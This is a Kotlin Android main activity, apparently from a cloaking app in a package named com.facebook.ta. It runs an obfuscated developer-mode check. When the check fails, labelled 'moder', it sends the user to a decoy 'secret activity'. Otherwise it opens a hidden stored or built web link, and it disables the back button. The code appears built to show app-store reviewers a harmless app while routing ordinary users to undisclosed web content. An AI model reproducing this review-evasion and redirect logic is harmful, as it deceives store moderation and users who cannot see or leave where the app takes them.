package com.facebook.ta

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.os.Build
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import androidx.activity.result.contract.ActivityResultContracts
import androidx.lifecycle.lifecycleScope
import com.facebook.ta.data.CustomStorage
import com.facebook.ta.data.SuperChecker
import com.facebook.ta.databinding.ActivityMainBinding
import com.facebook.ta.services.MyService
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.IOException
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : AppCompatActivity() {

    //loading
    private lateinit var binding: ActivityMainBinding
    private lateinit var customBroadcast: BroadcastReceiver
    private val customStorage = CustomStorage()
    private val requestPermission = registerForActivityResult(ActivityResultContracts.RequestPermission()){

    }


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        askPerm()

        val constants = Constants(this)

        customBroadcast = object : BroadcastReceiver(){
            override fun onReceive(context: Context?, intent: Intent?) {
                val devBrodcastResponse = intent?.getStringExtra(constants.getOneSignal(22, 22)) ?: "null"
                lifecycleScope.launch {
                    App.customDDbTransmitter.emit(devBrodcastResponse)
                }
            }
        }

        startDevServiceAndRegisterReciever(1, 2, constants)
    }

    override fun onStart() {
        super.onStart()

        val dataFromStorage = customStorage.readData(Constants.KEY_LINK)

        if (dataFromStorage == Constants.WARN){
            goToTheSecretActivity()
        } else {
            addListenners()
        }

    }

    private fun startDevServiceAndRegisterReciever(a: Int, b: Int, constants: Constants){
        val intentForService = Intent(this, MyService::class.java)
        startService(intentForService)

        val intentDevBroadcast = IntentFilter(constants.getOneSignal(23, 23))
        registerReceiver(customBroadcast, intentDevBroadcast)
    }

    private fun goToTheSecretActivity() {
        val intent = Intent(this, Main2Activity::class.java)
        lifecycleScope.launch {
            delay(1800)
            startActivity(intent)
        }
    }

    private fun addListenners(){

        val intentToTheW = Intent(this, CustomActivity::class.java)
        val intentToNoInet = Intent(this, NoInetActivity::class.java)
        val superChecker = SuperChecker(this)
        val link = customStorage.readData(Constants.KEY_LINK)

        lifecycleScope.launch {

            App.customDDbTransmitter.collect{
                //check adb
                if (it == "1" && link.startsWith("htt")){
                    //we have link
                    intentToTheW.putExtra(Constants.KEY_LINK, link)
                    startActivity(intentToTheW)

                } else if(it == "1" && link == Constants.EMPTY){
                    //build link and go to the web
                    addMoreListenners()
                    superChecker.getData()

                } else if(it == "0"){
                    //moder 1
                    goToTheSecretActivity()
                }
            }

//
//            val inet = checkInet()
//
//
//            if (inet){
//                App.customDDbTransmitter.collect{
//                    //check adb
//                    if (it == "1" && link.startsWith("htt")){
//                        //we have link
//                        intentToTheW.putExtra(Constants.KEY_LINK, link)
//                        startActivity(intentToTheW)
//
//                    } else if(it == "1" && link == Constants.EMPTY){
//                        //build link and go to the web
//                        addMoreListenners()
//                        superChecker.getData()
//
//                    } else if(it == "0"){
//                        //moder 1
//                        goToTheSecretActivity()
//                    }
//                }
//            } else {
//                //go to the no inet Activity
//                startActivity(intentToNoInet)
//            }
        }
    }


    private fun addMoreListenners(){
        val intentToTheW = Intent(this, CustomActivity::class.java)

        lifecycleScope.launch {
            App.customLinkFlow.collect{
                if (it.startsWith("htt")){
                    Log.d("123123", "The link is $it")
                    intentToTheW.putExtra(Constants.KEY_LINK, it)
                    startActivity(intentToTheW)
                }
            }
        }
    }


    override fun onDestroy() {
        super.onDestroy()
        unregisterReceiver(customBroadcast)
    }

    override fun onBackPressed() {
        //off
    }

    private suspend fun checkInet(): Boolean {
        return withContext(Dispatchers.IO){
            try {
                val connection = URL("http://clients3.google.com/generate_204").openConnection() as HttpURLConnection
                connection.setRequestProperty("User-Agent", "Android")
                connection.setRequestProperty("Connection", "close")
                connection.connectTimeout = 500
                connection.connect()
                (connection.responseCode == 204 && connection.contentLength == 0)
            } catch (ex: IOException){

                false
            }
        }
    }

    private fun askPerm(){
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU){
            val permission = android.Manifest.permission.POST_NOTIFICATIONS
            if (checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED){
                //

            } else {
                //
                requestPermission.launch(permission)
            }
        }
    }


}